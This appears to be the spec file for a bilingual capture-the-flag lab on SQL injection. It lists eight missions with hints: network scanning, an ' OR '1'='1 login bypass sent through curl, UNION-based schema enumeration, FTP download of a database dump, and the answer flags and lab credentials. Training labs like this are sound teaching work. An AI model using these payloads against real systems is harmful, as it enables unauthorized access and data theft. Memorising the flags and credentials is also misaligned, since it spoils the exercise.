# Lab 06 — SQL Injection & Database Exfiltration
**File:** `src/laboratorios/laboratorio06.ts`
**Difficulty:** Medium
**Category:** Web
**Network Range:** 192.168.40.0/24
**Target:** 192.168.40.11 (sql-injection-web)

---

## Steps (8 missions)

### 01 — Network Discovery
**Text:** Find the SQL injection target on the network
**Text ES:** Encontrá el objetivo de SQL injection en la red
**Discovery Level:** 1
**Hint 1 (tool):** Use arp-scan to discover hosts / Usá arp-scan para descubrir hosts
**Hint 2 (command):** `arp-scan 192.168.40.0/24`
**Validation:** discoveredHosts (minHosts: 1)

### 02 — Port Enumeration
**Text:** Scan for open services and identify the web application
**Text ES:** Escanea puertos abiertos e identifica la aplicación web
**Discovery Level:** 2
**Hint 1 (tool):** Use nmap to scan / Usá nmap para escanear
**Hint 2 (command):** `nmap -sV -p- 192.168.40.x` / `nmap -sV -p- 192.168.40.x`
**Validation:** scanResults (port: 80)
**Expected:** Ubuntu 18.04 LTS, Apache httpd 2.4.29, ProFTPD 1.3.5e on port 21, MySQL 5.7.26 on port 3306

### 03 — Identify SQL Injection Vector
**Text:** Access the login form and test for SQL injection vulnerability
**Text ES:** Accedé al formulario de login y testeá para SQL injection
**Discovery Level:** 2
**Hint 1 (tool):** Test payload: ' OR '1'='1 / Testeá payload: ' OR '1'='1
**Hint 2 (command):** Use curl to send the payload to /login / Usá curl para enviar el payload a /login
**Validation:** custom
**Payload:** `' OR '1'='1` in username field
**Login URL:** `http://<ip>/login`

### 04 — Exploit SQL Injection
**Text:** Successfully bypass authentication using SQL injection
**Text ES:** Bypassea autenticación exitosamente con SQL injection
**Discovery Level:** 3
**Hint 1 (tool):** Inject into the username field / Inyecta en el campo de usuario
**Hint 2 (command):** `curl -X POST http://192.168.40.x/login -d "username=' OR '1'='1&password=x"`
**Validation:** custom
**Bypass Method:** Authentication bypass via SQL injection

### 05 — Database Enumeration
**Text:** Extract database names and table information via SQL injection
**Text ES:** Extrae nombres de BD y información de tablas vía SQL injection
**Discovery Level:** 3
**Hint 1 (tool):** Use UNION-based SQL injection / Usá UNION-based SQL injection
**Hint 2 (command):** Payload: `' UNION SELECT table_name FROM information_schema.tables--` / Payload: `' UNION SELECT table_name FROM information_schema.tables--`
**Validation:** custom
**Target:** information_schema.tables

### 06 — FTP Access Setup
**Text:** Connect to FTP to download database dump
**Text ES:** Conectate a FTP para descargar dump de la BD
**Discovery Level:** 4
**Hint 1 (tool):** Use ftp command / Usá comando ftp
**Hint 2 (command):** `ftp 192.168.40.x (user: ftpuser, pass: ftp_dump_2024)` / `ftp 192.168.40.x (usuario: ftpuser, contraseña: ftp_dump_2024)`
**Validation:** ftpLogin
**FTP Credentials:** ftpuser / ftp_dump_2024

### 07 — Extract Database Dump
**Text:** Download the database dump file containing user credentials
**Text ES:** Descargá el archivo de dump que contiene credenciales de usuarios
**Discovery Level:** 4
**Hint 1 (tool):** Look for database_dump.sql in FTP / Buscá database_dump.sql en FTP
**Hint 2 (command):** Use `get database_dump.sql` in FTP shell / Usá "get database_dump.sql" en la shell de FTP
**Validation:** fileRead
**File:** `database_dump.sql`
**Location:** `/srv/ftp/database_dump.sql`

### 08 — Capture Flag
**Text:** Find and extract the root flag from the database dump
**Text ES:** Encontrá y extrae la flag de root del dump de la BD
**Discovery Level:** 4
**Hint 1 (tool):** Search for flag in the SQL dump file / Buscá "flag" en el archivo de dump SQL
**Hint 2 (command):** `cat database_dump.sql | grep -i flag` / `cat database_dump.sql | grep -i flag`
**Validation:** fileRead (fileType: flag)
**Flags:**
- **User:** ZIL{SQL_INJECTION_FOUND}
- **Root:** ZIL{DATABASE_COMPROMISED}

---

## Database Credentials (Hidden in Dump)
- **MySQL Root:** root / SQLr00t@2024!
- **DB Contains:** users table with admin, developer, and user accounts
- **Internal Note:** MySQL password exposed in dump comments
